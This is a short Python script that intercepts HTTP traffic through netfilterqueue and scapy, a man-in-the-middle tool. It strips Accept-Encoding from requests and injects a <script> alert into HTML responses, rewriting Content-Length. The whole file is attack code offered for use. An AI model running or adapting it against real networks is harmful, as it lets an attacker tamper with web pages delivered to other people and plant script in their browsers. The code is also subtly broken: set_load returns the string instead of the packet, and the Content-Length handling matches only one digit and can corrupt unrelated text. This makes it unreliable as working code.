#!/usr/bin/env python
import re

import netfilterqueue
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP, TCP
import argparse

from scapy.packet import Raw


def set_load(packet, new_load):
    packet[Raw].load = new_load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return new_load


def process_packets(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(TCP):  # Check for the TCP layer
        if scapy_packet.haslayer(Raw):
            load = scapy_packet[Raw].load.decode('utf-8', errors='ignore')
            if "HTTP/1.1" in load:
                print("[+] HTTP REQUEST")
                load = re.sub(r"Accept-Encoding: [^\r\n]*\r\n", "", load)
            elif re.search(r"HTTP/1.1 2\d{2}", load):
                print("[+] RESPONSE")
                injection_code = "<script>alert('You've been hacked, lol')</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search(r"(?:Content-Length:\s)(\d)", load)  # noqa: W605
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    print(content_length)

            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet, encoding='utf-8'))
    packet.accept()


# Create a netfilterqueue object and bind it to queue 0
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets, 100)

try:
    print("[+] Waiting for packets...")
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting...")
